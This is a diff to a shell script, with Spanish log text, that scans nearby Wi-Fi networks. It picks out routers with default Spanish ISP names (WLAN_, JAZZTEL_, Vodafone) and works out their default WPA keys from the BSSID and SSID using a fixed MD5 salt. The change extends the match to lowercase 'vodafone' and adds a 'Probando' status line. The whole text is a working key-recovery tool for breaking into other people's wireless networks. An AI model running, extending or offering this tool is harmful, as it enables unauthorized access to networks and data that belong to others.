@@ -19,9 +19,10 @@ while : ; do
 	echo -n "."
 	TMP=$(tempfile)
 	iwlist $1 scan > $TMP
-	SSIDLIST=`cat $TMP |egrep "ESSID:\"((WLAN|JAZZTEL)_|Vodafone)(\w){4}" |cut -f 2 -d \"`
+	SSIDLIST=`cat $TMP |egrep "ESSID:\"((WLAN|JAZZTEL)_|Vodafone|vodafone)(\w){4}" |cut -f 2 -d \"`
 	if [ ! -z "$SSIDLIST" ]; then
 		for SSID in $SSIDLIST; do
+			 echo "Probando $SSID"
 			echo "$DONE" |grep -w "$SSID" >/dev/null
 			if [ $? != 0 ]; then
 				MAC=$(cat $TMP |grep -B6 "$SSID" |grep "Address:" |awk '{print $5}' |head -n 1)
@@ -31,7 +32,7 @@ while : ; do
 					BSSIDP=$(echo -n "$MAC" |tr 'A-Z' 'a-z' |tr -d : |cut -c -8)
 					KEY=$(echo -n "${BSSIDP}${HEAD}" |md5sum |tr 'a-z' 'A-Z' |cut -c -20)
 				else
-					HEAD=$(echo -n "$SSID" |sed -e "s/WLAN_//" -e "s/JAZZTEL_//" -e "s/Vodafone//" |tr 'a-z' 'A-Z')
+					HEAD=$(echo -n "$SSID" |sed -e "s/WLAN_//" -e "s/JAZZTEL_//" -e "s/Vodafone//" -e "s/vodafone//" |tr 'a-z' 'A-Z')
 					BSSID=$(echo -n "$MAC" |tr 'a-z' 'A-Z' |tr -d :)
 					BSSIDP=$(echo -n "$BSSID" |cut -c-8)
 					KEY=$(echo -n bcgbghgg$BSSIDP$HEAD$BSSID |md5sum |cut -c-20)
